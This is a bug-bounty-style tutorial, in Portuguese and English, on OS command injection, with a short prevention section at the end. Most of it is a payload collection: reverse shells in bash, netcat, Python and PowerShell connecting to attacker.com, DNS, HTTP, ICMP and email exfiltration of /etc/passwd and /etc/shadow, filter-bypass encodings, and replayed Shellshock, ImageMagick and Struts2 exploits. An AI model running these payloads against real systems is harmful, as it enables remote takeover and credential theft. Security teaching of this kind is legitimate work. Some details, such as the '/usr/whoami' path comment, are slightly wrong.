# OS Command Injection

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $3,000 - $25,000 USD

---

## 📚 Índice

1. [Command Injection Fundamentals](#command-injection-fundamentals)
2. [Shell Metacharacters](#shell-metacharacters)
3. [OS-Specific Exploitation](#os-specific-exploitation)
4. [Blind Command Injection](#blind-command-injection)
5. [Filter Bypass Techniques](#filter-bypass-techniques)
6. [Data Exfiltration](#data-exfiltration)
7. [Privilege Escalation](#privilege-escalation)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 Command Injection Fundamentals

### O Que É Command Injection?

**OS Command Injection** ocorre quando uma aplicação **executa comandos do sistema operacional** usando entrada do usuário **sem sanitização adequada**, permitindo que atacantes executem **comandos arbitrários**.

**Vulnerable Pattern:**

```python
import os
import subprocess

# ❌ VULNERÁVEL
filename = request.args.get('filename')
os.system(f"cat {filename}")
```

**Attack:**

```
GET /download?filename=file.txt; whoami
```

**Executed Command:**
```bash
cat file.txt; whoami
# Returns:
# [file contents]
# www-data
```

**Why Dangerous:**

```
✓ Full system access
✓ Read/write arbitrary files
✓ Network access (exfiltrate data)
✓ Lateral movement
✓ Privilege escalation
✓ Install backdoors
```

---

## ⚡ Shell Metacharacters

### Command Separators

**Linux/Unix:**
```bash
;   # Sequential execution
    # cmd1; cmd2    → Execute cmd1, then cmd2

&&  # Conditional AND
    # cmd1 && cmd2  → Execute cmd2 only if cmd1 succeeds

||  # Conditional OR
    # cmd1 || cmd2  → Execute cmd2 only if cmd1 fails

&   # Background execution
    # cmd1 & cmd2   → Execute cmd1 in background, then cmd2

|   # Pipe (output of cmd1 to input of cmd2)
    # cmd1 | cmd2

$(...)  # Command substitution
    # echo $(whoami)

`...`   # Command substitution (backticks)
    # echo `whoami`

\n  # Newline (in some contexts)
    # cmd1\ncmd2
```

**Windows:**
```cmd
&   # Sequential execution
    # cmd1 & cmd2

&&  # Conditional AND
    # cmd1 && cmd2

||  # Conditional OR
    # cmd1 || cmd2

|   # Pipe
    # cmd1 | cmd2

%VAR%  # Variable expansion
    # echo %USERNAME%

$(...)  # PowerShell command substitution
```

### Injection Examples

**Example 1: Semicolon**
```bash
# Vulnerable command
ping -c 1 192.168.1.1

# Injection
192.168.1.1; cat /etc/passwd

# Executed
ping -c 1 192.168.1.1; cat /etc/passwd
```

**Example 2: AND Operator**
```bash
# Vulnerable command
nslookup google.com

# Injection
google.com && whoami

# Executed
nslookup google.com && whoami
```

**Example 3: Pipe**
```bash
# Vulnerable command
grep "user" users.txt

# Injection
users.txt | cat /etc/passwd

# Executed
grep "user" users.txt | cat /etc/passwd
```

**Example 4: Command Substitution**
```bash
# Vulnerable command
echo "Hello, World"

# Injection
$(cat /etc/passwd)

# Executed
echo "Hello, $(cat /etc/passwd)"
# Output shows /etc/passwd contents
```

---

## 💻 OS-Specific Exploitation

### Linux/Unix Commands

**Information Gathering:**
```bash
whoami          # Current user
id              # User ID and groups
hostname        # System hostname
uname -a        # Kernel version
cat /etc/passwd # User list
cat /etc/shadow # Password hashes (if root)
ps aux          # Running processes
netstat -tulpn  # Network connections
ifconfig        # Network interfaces
```

**File Operations:**
```bash
ls -la /        # List files
cat /etc/passwd # Read file
cat /var/www/html/config.php  # Database credentials
find / -name "*.conf" 2>/dev/null  # Find config files
tar -czf /tmp/backup.tar.gz /var/www  # Compress website
```

**Reverse Shell:**
```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat reverse shell
nc attacker.com 4444 -e /bin/bash

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Windows Commands

**Information Gathering:**
```cmd
whoami                  # Current user
hostname                # Computer name
systeminfo              # Detailed system info
net user                # List users
net localgroup administrators  # Admin users
ipconfig /all           # Network config
netstat -ano            # Network connections
tasklist                # Running processes
```

**File Operations:**
```cmd
dir C:\                 # List files
type C:\Windows\System32\drivers\etc\hosts  # Read file
copy C:\important.txt C:\xampp\htdocs\public\  # Exfiltrate file
```

**PowerShell Reverse Shell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 🔍 Blind Command Injection

### Scenario: No Direct Output

**Vulnerable Code:**
```python
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # Execute ping but don't return output
    subprocess.run(f"ping -c 1 {host}", shell=True)
    return "Ping executed"
```

**Problem:** Output not visible to attacker

### Detection Method 1: Time Delays

**Payload:**
```bash
; sleep 10

# Or
&& sleep 10

# Or
| sleep 10
```

**Test:**
```python
import requests
import time

url = "https://target.com/ping?host="

# Test 1: Normal request
start = time.time()
requests.get(url + "192.168.1.1")
normal_time = time.time() - start
print(f"Normal time: {normal_time:.2f}s")

# Test 2: With sleep injection
start = time.time()
requests.get(url + "192.168.1.1; sleep 10")
injection_time = time.time() - start
print(f"Injection time: {injection_time:.2f}s")

if injection_time - normal_time > 9:
    print("[+] Blind command injection confirmed!")
```

### Detection Method 2: DNS Exfiltration

**Payload:**
```bash
; nslookup $(whoami).attacker.com

# Or
&& dig $(cat /etc/passwd | base64).attacker.com

# Or
| curl http://$(hostname).attacker.com
```

**Attacker's DNS Server:**
```python
# Simple DNS logger
from dnslib.server import DNSServer, DNSLogger, DNSRecord

class DNSLogger:
    def log_request(self, handler):
        request = DNSRecord.parse(handler.data)
        print(f"[+] Received DNS query: {request.q.qname}")

server = DNSServer(DNSLogger(), port=53, address="0.0.0.0")
server.start()
```

**Result:**
```
[+] Received DNS query: www-data.attacker.com
[+] Received DNS query: aG9zdG5hbWU=.attacker.com  # base64 encoded data
```

### Detection Method 3: HTTP Callback

**Payload:**
```bash
; curl https://attacker.com/callback?data=$(whoami)

# Or
&& wget https://attacker.com/exfil?data=$(cat /etc/passwd | base64)

# Or (Windows)
; powershell Invoke-WebRequest -Uri https://attacker.com/callback?data=$env:USERNAME
```

**Attacker's HTTP Server:**
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/callback')
def callback():
    data = request.args.get('data')
    print(f"[+] Received data: {data}")
    return "OK"

app.run(host='0.0.0.0', port=80)
```

### Detection Method 4: File-Based

**Payload:**
```bash
; echo "pwned" > /var/www/html/proof.txt

# Or
&& cat /etc/passwd > /var/www/html/static/exfil.txt
```

**Verification:**
```python
import requests

# Execute injection
requests.get("https://target.com/ping?host=127.0.0.1; echo 'pwned' > /var/www/html/proof.txt")

# Check if file created
response = requests.get("https://target.com/proof.txt")

if response.status_code == 200 and "pwned" in response.text:
    print("[+] Blind command injection confirmed!")
```

---

## 🛡️ Filter Bypass Techniques

### Bypass 1: Blacklist Filtering

**Blocked:** `;`, `|`, `&&`, `||`

**Bypass with Newline:**
```bash
%0A  # URL-encoded newline

# Payload
192.168.1.1%0Awhoami
```

**Bypass with Carriage Return:**
```bash
%0D  # URL-encoded \r

# Payload
192.168.1.1%0Dwhoami
```

### Bypass 2: Space Filtering

**Blocked:** Space character

**Bypass 1: $IFS (Internal Field Separator)**
```bash
cat${IFS}/etc/passwd
```

**Bypass 2: Tab**
```bash
cat%09/etc/passwd  # %09 = tab
```

**Bypass 3: Brace Expansion**
```bash
{cat,/etc/passwd}
```

### Bypass 3: Keyword Filtering

**Blocked:** `cat`, `whoami`, `/etc/passwd`

**Bypass 1: String Concatenation**
```bash
w''hoami
c''at /etc/passwd
who$()ami
c$()at /etc/passwd
```

**Bypass 2: Variable Expansion**
```bash
a=w;b=hoami;$a$b
```

**Bypass 3: Wildcards**
```bash
/???/??t  # /bin/cat
/???/??ami  # /usr/whoami
```

**Bypass 4: Hex Encoding**
```bash
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
# Decodes to: cat /etc/passwd
```

**Bypass 5: Base64 Encoding**
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
# Decodes to: cat /etc/passwd
```

### Bypass 4: Path Filtering

**Blocked:** `/etc/passwd`, `/bin/bash`

**Bypass 1: Relative Paths**
```bash
cat ../../etc/passwd
```

**Bypass 2: Wildcards**
```bash
cat /e??/p??swd
cat /e*c/p*sswd
```

**Bypass 3: Variable Expansion**
```bash
cat $HOME/../../../etc/passwd
```

---

## 📤 Data Exfiltration

### Method 1: HTTP POST

**Payload:**
```bash
; curl -X POST -d "data=$(cat /etc/passwd | base64)" https://attacker.com/exfil
```

### Method 2: DNS Tunneling

**Payload:**
```bash
; for line in $(cat /etc/passwd); do nslookup $line.attacker.com; done
```

### Method 3: ICMP Exfiltration

**Payload:**
```bash
; cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line attacker.com; done
```

**Attacker captures ICMP packets:**
```bash
tcpdump -i eth0 -n 'icmp' -X
```

### Method 4: Email

**Payload:**
```bash
; cat /etc/shadow | mail -s "Exfil" attacker@evil.com
```

---

## 🔥 Real-World Cases

### Case 1: Shellshock (CVE-2014-6271)

**Vulnerability:** Bash environment variable parsing

**Payload:**
```bash
() { :; }; echo "Vulnerable"; /bin/bash -c "cat /etc/passwd"
```

**Set in HTTP header:**
```http
User-Agent: () { :; }; /bin/bash -c "curl https://attacker.com/$(whoami)"
```

**Impact:** Remote code execution on millions of servers

### Case 2: ImageMagick (CVE-2016-3714)

**Vulnerability:** Command injection in image processing

**Payload (image.jpg):**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://attacker.com/image.jpg"|curl https://attacker.com/exfil?data=$(cat /etc/passwd | base64)"'
pop graphic-context
```

**Impact:** RCE on websites using ImageMagick

**Bounty:** Multiple $10,000+ payouts

### Case 3: Struts2 (CVE-2017-5638)

**Vulnerability:** OGNL injection → Command execution

**Payload:**
```http
Content-Type: %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

**Impact:** Equifax breach (143M records), $700M settlement

---

## 🛡️ Prevention

### 1. Avoid Shell Execution

```python
# ❌ DANGEROUS
os.system(f"ping -c 1 {host}")

# ✅ SAFE: Use subprocess with array
import subprocess
subprocess.run(["ping", "-c", "1", host], shell=False)
```

### 2. Input Validation

```python
import re

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False

    parts = ip.split('.')
    return all(0 <= int(part) <= 255 for part in parts)

# Usage
host = request.args.get('host')
if not is_valid_ip(host):
    return "Invalid IP", 400

subprocess.run(["ping", "-c", "1", host], shell=False)
```

### 3. Use Safe APIs

```python
# Instead of ping via shell
import socket

def check_host(hostname):
    try:
        socket.gethostbyname(hostname)
        return True
    except socket.error:
        return False
```

---

**Última atualização**: 2024
**Versão**: 1.0
